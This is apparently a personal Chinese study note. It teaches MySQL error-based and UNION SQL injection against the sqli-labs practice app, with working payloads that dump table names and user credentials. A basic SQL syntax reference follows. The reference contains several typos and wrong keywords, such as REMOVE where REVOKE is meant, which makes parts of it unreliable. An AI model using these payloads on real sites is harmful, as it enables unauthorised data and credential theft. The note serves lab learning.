---
title: "sql_notes"
date: 2026-01-21 19:39:43
categories: 默认分类
tags: [笔记]
---





### 1.双写select

### 2.报错注入

floor 向下取整

rand():0-1

floor(rand()*2):0,1,1循环



3 种核心方法：`floor`、`extractvalue`、`updatexml`——**报错注入就是 “故意让数据库报错，从错误信息里偷数据”**

###### 先统一前提（CTF 里常用）

假设是单引号字符型注入（比如 Less-1），注入点是`?id=1'`，我们要偷的是 “当前数据库名”（用`database()`函数获取）。

#### 1. floor 报错注入（最经典：临时表撞车）

**核心逻辑**：(MySQL 在 `GROUP BY` 时，如果产生了“同一组的键不同但随机重复”，就会报错)

​	用`group by`建临时表，配合`floor(rand(0)*2)`生成重复数据，导致 “主键冲突” 报错。

1.1 主键： `concat(数据库名, floor(rand(0)*2))`的结果，比如`security1`

​	  concat(database(),0x7e,floor(rand(0)*2)) -> security~1	

提示： x会多算一次：（因为外面groupby算一次，里面as x也算一次），所以第一次处理从0变1，第二次处理到1了，但由于主键重复出错了所以就不用再算下去了

​       

1.2 `group by x`：分组不是我们的目的，逼它临时建表才是我们目标

​    `select 1 from (...)`： 这行是 “随便查个值凑数”—— 我们的目标不是查`1`，而是让里面的子查询执行（从而触发报错）。

​			因为外层需要一个合法的查询语句，所以随便选个`1`（也可以选`2`、`3`），只要能让子查询跑起来就行。

​    `and (...)--+`：让前面的语句合法，让后面的语句闭嘴（SQL 里`and`两边都要是布尔值）	

​    `information_schema.tables`是 MySQL 自带的表，里面存着所有数据库的表信息，数据量足够大（至少有几十行）。

  			我们需要这么多数据，是为了让`group by x`能多次计算`x`的值，才有机会生成重复的`x`（比如`security~1`），触发主键冲突报错。如果选数据少			的表（比如只有 1 行），`group by x`只算一次`x`，就没法重复了。



```sql
-- 内层子查询（当临时表）：统计count(*)并拼接x
select count(*),concat(database(),0x7e,floor(rand(0)*2)) as x 
from information_schema.tables 
group by x;  

-- 外层查询：从这个临时表查数据
select 1 from (上面的子查询) as a;
```

内层子查询会先执行，生成一个包含`count(*)`和`x`的临时表，外层查询再从这个临时表里查`1`（只是为了让子查询执行）

​     子查询:必须用括号`()`包起来；先执行内层子查询，再执行外层查询；

 	  x从子查询结果里查数据时，必须给子查询起别名.



- ```plaintext
  ?id=1' and (select 1 from (select count(*),concat(database(),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+
  ```

  

- 报错效果

  ```
  Duplicate entry 'security~1' for key 'group_key'
  ```

  

#### 2. extractvalue 报错注入（XML 函数：非法路径）

```
extractvalue(xml_target, xpath_expression)
```

xml_target随便填

xpath_expression填执行语句



- **核心逻辑**：`extractvalue`本是 MySQL 解析 XML 的函数，要求第`二`个参数必须是 “合法 XML 路径”（比如`/bookstore/book`）；我们故意传 “数据库名 + 非法格式”，它会报错说 “路径不对”，顺带泄露数据。

- 实战语句

- ```plaintext
  ?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+
  ```

  

- 报错效果

  

  ```
  XPATH syntax error: '~security~'
  ```

  

#### 3. updatexml 报错注入（XML 函数：非法更新）

```
updatexml(xml_document, xpath_expr, new_value)
```

xml_target:xml⽂档，随便填写 

xpath_expr:关键注⼊点，填⼊查询语句 

new_value：随意填



- **核心逻辑**：和`extractvalue`类似，`updatexml`本是修改 XML 数据的函数，同样要求第二个参数是合法 XML 路径；传非法格式就会报错，泄露拼接的数据。

  

- ```plaintext
  ?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
  ```

  

- 报错效果

  ：

  ```
  XPATH syntax error: '~security~'
  ```

  

##### 3 种方法区别

| 方法         | 原理           |      | 缺点                             |
| ------------ | -------------- | ---- | -------------------------------- |
| floor        | 临时表主键冲突 |      | 语句长，要嵌套子查询             |
| extractvalue | XML 路径非法   |      | 能泄露的数据长度有限（约 32 位） |
| updatexml    | XML 路径非法   |      | 同样有长度限制                   |

##### 技巧

1. **用`0x7e`（~）做分隔符**：避免数据和报错自带内容混淆，一眼就能找到目标（比如`~security~`）；

2. 长度不够怎么办

   ：如果数据太长（比如表名多），用

   ```
   substr()
   ```

   

```plaintext
?id=1' and extractvalue(1,concat(0x7e,substr(database(),1,10),0x7e))--+
```

（`substr(数据, 起始位置, 长度)`，分段获取长数据）；

**什么时候用报错注入**：页面没有正常回显（比如联合查询看不到结果），但会显示 SQL 错误信息时，直接用！





库解释意思系统：

1.information_schema库：信息数据库
例如：数据库名，数据库表，表字段（单词组成的格式）的数据类型与访问权限。
2.SCHEMATA表：提供MySQL实例中所有数据库信息
show databases 结果来源此表
3.TABLES表：提供关于数据中表的信息
4.COLUMNS表：提供表中列信息，详细描述某张表的所有列以及每个列信息

mysql库：MySQL的核心数据库
储存 数据库的用户，权限设置，关键字
performance_schema库：内存数据库
sys库：可以查询谁使用最多的资源、哪张表被访问最多



##### MySQL（数据库系统）结构

MySQL（数据库系统）
│
├── information_schema（系统库）
│     ├── tables（表信息，表）
│     ├── columns（字段信息，表）
│     └── schemata（所有数据库名，表）
│
├── pikachu（你创建的库）
│     ├── users（表）
│     │     ├── id（列）
│     │     ├── username（列）
│     │     └── password（列）
│     │
│     └── messages（表）
│           ├── id（列）
│           └── content（列）
│
├── ctftraining（比赛库）
│     └── flag（表）
│           └── flag（列）
│                └── 'flag{xxx}' （数据）
│
└── 其他数据库……



?id=1' and extractvalue(1, concat(0x7e,(select group_concat(table_name) 
from information_schema.tables 
where table_schema=database()),0x7e))--+

?**id**=**1%27%20and%20extractvalue(1,concat(0x7e,(select** group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+



### sqli-5题解

对于怎样输入都没有回显位的题目，考虑[报错注入]，这样我们就可以通过报错和获取信息



1.判断有无注入点 

?id=1 ?id=1' ，两个页面返回不一样，说明没有过滤`'`,存在注入点

2.判断注入类型：

```cobol
//判断字符型
?id=1' and '1'='1
?id=1' and '1'='2

//判断数字型      
?id=1 and 1=1
?id=1 and 1=2
```

3.判断有几个字段

（为什么要判断，因为要让数据库允许你插入，就要让你自己的select列数=原始后台select列数

像这样：

【原始查询】     SELECT a, b, c FROM xxx
【你注入的查询】 UNION SELECT x, y, z）



?id=1' order by 3--+

?id=1' order by 4--+



4.确定回显位

?id=-1' union select 1,2,3--+

发现没有报错，也没回显，用报错注入

5.报表名(必须写0x7e，~在语法里面是另外一种意思)

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+
```



```
XPATH syntax error: '~emails,referers,uagents,users~'
```

6.报列名

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e))--+
```

```
XPATH syntax error: '~id,username,password~'
```

7.报具体数据

```
select group_concat(username,'~',password) from users
```

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e))--+
```

```csharp
XPATH syntax error: '~Dumb~Dumb,Angelina~I-kill-you,D'
```





① 查库：
UNION SELECT 1,2,GROUP_CONCAT(schema_name)
FROM information_schema.schemata--

② 查表：
UNION SELECT 1,2,GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema=DATABASE()--

③ 查字段：
UNION SELECT 1,2,GROUP_CONCAT(column_name)
FROM information_schema.columns
WHERE table_schema='xxx' AND table_name='yyy'--



④ 查数据：
UNION SELECT 1,2,GROUP_CONCAT(col)
FROM xxx.yyy--









1.注释：
--空格     
 #
2.列出所有数据库：
show databases；
3.查看某一数据库中的所有表
use 哪一个库；
1.use mysql；
show tables；
2.show tables from mysql;
3.select函数
select now（）；
查看时间
select databases（）；
查看当前选择的库
select user（）
查看当前登录数据库的用户


sql通用语法
1.分号结尾
2.不区分大小写
3.注释：单行：--或#
多行：/*内容*/

sql分类
ddl                definition定义数据库对象
dml      data manipulation  language 对数据库里数据增删改
dql               query  查询表中记录
dcl                control 控制创建数据库用户和权限

### ddl

1.查询
当前数据库
SELECT DATABASE();
所有数据库
SHOW DATABASES;
2.创建
CREATE DATABASE [IF NOT EXITS] 数据库名 [DEFAULT CHARCET字符集] [COLLATE排序规则];
3.删除
DROP DATABASE [IF EXISTS] 数据库名;
4.使用
USE 数据库名;

**ddl 表操作 查询**

1.查询当前数据库所有表
SHOW TABLES;
2.查询表结构
DESC 表名；
3.查询指定的建表语句
SHOW CREATE TABLE表名；

**ddl 表操作 创建**

CREATE TABLE 表名（
字段1 字段1类型 [COMMENT 字段1注释],
字段2 字段2类型 [COMMENT 字段2注释],
字段3 字段3类型 [COMMENT 字段3注释],
.......
字段n 字段n类型 [COMMENT 字段n注释]
)[COMMENT 表注释]；
备注：[..]为可选参数，最后一个字段没有逗号

**ddl 表操作 数据操作** 
1.三种：数值类型，字符串类型，日期时间类型
2.数值类型：
TINYINT小整数值 1
SMALLINT大整数值 2
MEDIUMINT 3
INT INTERGER 4
BIGINT极大整数值 8
FLOAT单精度浮点型 4
DOUBLE双精度 8
DECIMAL小数值

字符串类型
定长字符串CHAR
变长字符串VARCHAR

不超过255个字符的二进制数据TINYBLOB
二进制形式的长文本数据BLOB

二进制形式的中等长度文本数据MEDIUMBLOB
二进制形式的中等长度文本数据MEDIUMBLOB

二进制形式的极大文本数据LONGBLOB

短文本字符串TINYTEXT

中等长度文本数据DEDIUMTEXT

长文本数据TEXT


极大文本数据LONGTEXT

**ddl 表操作 修改**
1.添加字段
ALTER TABLE 表名 ADD 字段名 类型（长度） [COMMENT注释] [约束]；
例子：
ALTER TABLE EMP ADD NICKNAME VARCHAR(20);
2.修改数据类型
ALTER TABLE 表名 MODIFY 字段名 新数据类型（长度）； 
3.修改字段名和字段类型
ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型（长度) [COMMENT注释] [约束]；
例子：
ALTER TABLE EMP CHANGE NICKNAME USERNAME VARCHAR(30) COMMENT '昵称'；
4.删除字段
ALTER TABLE 表名 DROP 字段名 ;
例子：
ALTER TABLE EMP DROP USERNAME;
5.
删除表
DROP TABLE [IF EXISTS] 表名;

删除指定表，并重新创建该表
TRUNCATE TABLE 表名；

### **dml数据操作语言**

**添加数据INSERT**

1.给指定字段添加数据
INSERT INTO 表名（字段名1，字段名2..）VALUES (值1，值2....)；
2.给全部字段添加数据
INSERT INTO 表名 VALUES (值1，值2....)；
3.批量添加数据
INSERT INTO 表名（字段名1，字段名2..）VALUES (值1，值2....)，(值1，值2....)，(值1，值2....)；
INSERT INTO 表名 VALUES (值1，值2....)，(值1，值2....)，(值1，值2....)；

注意：
插入数据时，指定的字段顺序需要与值的顺序一一对应
字符串和日期型数据应该包含在引号中
插入的数据大小，应该在字段的规定范围内

**修改数据UPDATE**
UPDATE 表名 SET 字段1=值1，字段2=值2，...[WHERE 条件]；
修改语句的条件可选，如果没有，修改整张表的数据
举例：
1.
UPDATE EMPLOYEE SET NAME = 'tyq' WHERE ID = 1;
2.
UPDATE EMPLOYEE SET NAME = 'TYQ',GENDER = '女' WHERE ID = 1;
3.
UPDATE EMPLOYEE SET ENTRYDATE = '2008.8.8';

**删除数据DELETE**
DELETE FFROM 表名 [ WHERE 条件]
注意：
1.delete语句条件可选，若没有删除整张表
2.delete语句不能删除某个特定的值（可以使用update）
举例：
DLEETE FROM EMPLOYEE WHERE GENDER = '女';
DELETE FROM EMPLOYEE;

### DQL

dql语法：
SELECT
字段列表
FROM
表明列表
WHERE
条件列表
GROUP BY
分组字段列表
HAVING
分组后条件列表
ORDER BY
排序字段列表
LIMIT
分页参数


dql基本查询
1.查询多个字段
SELECT 字段1，字段2，字段n FROM 表名；
举例：
SELECT NAME,AGE FROM EMP;

SELECT * FROM 表名；
2.设置别名
SELECT 字段1 [AS别名1]，字段2 [AS 别名2] ... FROM 表名；
举例：
SELECT WORKADDRESS AS '工作地址' FROM EMP;
3.去除重复记录
SELECT DISTINCT 字段列表 FROM 表名；

DQL条件查询
1.语法：
SELECT 字段列表 FROM 表名 WHERE 条件列表；
2.条件：
比较运算符

> < = <= >= 
> <>或!= 不等于
> BETWEEN...AND...  在某个范围内（取两边）
> IN(...)               在in后面列表中的值，多选一？
> LIKE 占位符    模糊匹配（_匹配单个字符，%匹配任意个字符）
> IS NULL        是NULL（没有数据状态）
> 逻辑运算符
> AND 或&&     并且
> OR 或||            或
> NOT 或!          非  

举例：
SELECT * FROM EMP WHERE AGE = 88;
SELECT * FROM EMP WHERE AGE <>20;
SELECT * FROM EMP WHEAR IDCARD IS NULL;
SELECT * FROM EMP WHEAR IDCARD IS NOT NULL;
SELECT * FROM EMP WHERE AGE <>20 OR AGE >88;
SELECT * FROM EMP WHERE AGE BETWEEN  15 AND 88;
SELECT * FROM EMP WHERE GENDER = '女' AND AGE < 25;
SELECT * FROM EMP WHERE AGE IN (18,25,40);
SELECT * FROM EMP WHERE NAME LIKE  '_ _ _';
SELECT * FROM EMP WHERE IDCARD LIKE '%X'; # %表示多个字符，%x表示最后一个字符为X

dql聚合函数
1.将一列数据作为一个整体，进行纵向计算
2.常见聚合函数
COUNT统计数量
SELECT COUNT (*) FROM EMP;
SELECT COUNT(IDCARD) FROM EMP;
MAX最大值
SELECT MAX(AGE) FROM EMP;
MIN最小值
AVG平均值
SELECT (AGE) FROM EMP;
SUM求和
SELECT SUM(AGE) FROM EMP WHERE WORKADDRESS = '西安';
3.语法：
SELECT 聚合函数(字段列表) FROM 表名;
4.注意：
null值不参加聚合函数运算

dql 分组查询
1.语法:
SELECT 分组字段 聚合函数 FROM 表名 [WHERE 表名] GROUP BY 分组字段名 [HAVING 分组后过滤条件] ；
where和having区别：
1.分组之前进行过滤，不满足where条件不进行分组
2.判断条件不同：where不能对聚合函数进行判断，having可以
3.执行顺序：where>聚合函数>having

1
SELECT GENDER,COUNT(*) FROM EMP GROUP  BY GENDER ;
SELECT GENDER,AVG(AGE) FROM EMP GRUOP BY GENDER;
SELECT WORKADDRESS,COUNT(*) FROM EMP WHERE AGE<45 GROUP BY WORKADDRESS HAVING COUNT(*) >=3;

dpl排序查询
1.语法：
SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1，字段2 排序方式2；
2.排序方式
ASC升序（默认值）
DESC降序
先按照排序1进行排序，若相同则按照排序方式2
举例：
 SELECT * FROM EMP ORDER BY AGE ASC;
SELECT * FROM EMP ORDER BY TIME DESC; 
SELECT * FROM EMP ORDER BY AGE, TIME DESC ;

dql 分页查询
1.语法：
SELECT 字段列表 FROM 表名 LIMIT 起始索引，查询返回记录数；
注意：
1.起始索引从0开始
起始索引 = （查询页码-1）*每页显示记录数
2.分页查询：不同数据库有不同的语法，mysql是limit
3.如果查询的是第一页数据，起始索引可以省
直接写：limit 10
举例：
SELECT * FROM EMP LIMIT 10;
SELECT * FROM EMP LIMIT 10,10;

案例：
SELECT * FROM EMP WHERE GENDER = '女'  AND AGE IN (20,21,22,23);
SELECT * FROM EMP WHERE GENDER = '男' AND (AGE ;BETWEEN 20 AND 40 ) AND NAME LIKE '___';
SELECT  GENDER,COUNT(*) FROM EMP WHERE AGE <60 GROUP BY GENDER;
SELECT NAME,AGE FROM EMP WHERE AGE<=35 ORDER BY AGE ASC,TIME ASC;
SELECT * FROM EMP WHERE GENDER = "女" AND AGE BETWEEN 20 AND 40 ORDER BY AGE,TIME ASC LIMIT 5;

dql 顺序
编写顺序：
SELECT
字段列表   //「字段」= Excel 里的「列名」
// 字段列表 = 列名集合

FROM
表明列表
WHERE
条件列表
GROUP BY
分组字段列表
HAVING
分组后条件列表
ODER BY
排序字段列表
LIMIT
分页参数

执行顺序和这个不同

DCL

1.用户管理（谁可以访问mysql数据库）
1.1创建用户
CREATE USER '用户名'@'主机名' IDENTIFIED BY '密码';
1.2修改用户密码
ALTER USER '用户名'@'主机名' IDENTIFIED WITH mysql_native_password BY '密码';
1.3删除用户
DROP USER '用户名'@'主机名'；


2.权限控制（可以访问啥，并对他们可以做哪些操作）
2.1授权
GRANT 权限列表 ON 数据库.表名 TO '用户名'@'主机名';
2.2撤销权限
REMOVE 权限列表 ON 数据库名.表名 FROM '用户名'@'主机名';

函数
1.字符串函数
CONCAT字符串拼接

​	concat_ws(';',username,passwd,.....)  //分隔符放最前面

LOWER改为小写
UPPER改为大写
LPAD左填充
RPAD右填充
TRIM去除左右两边空格，不包括中间
SUBSTRING字符串截取
2.数值函数 需补充
3.日期函数
CUEDATE获取当前日期
CURTIME获取当前时间
NOW获取curtime和curdate
YEAR MONTH DAY获取所需的东东
DATE_ADD 添加时间周期
DATAIFF 计算两个日期相减
4.流程函数 需补充 

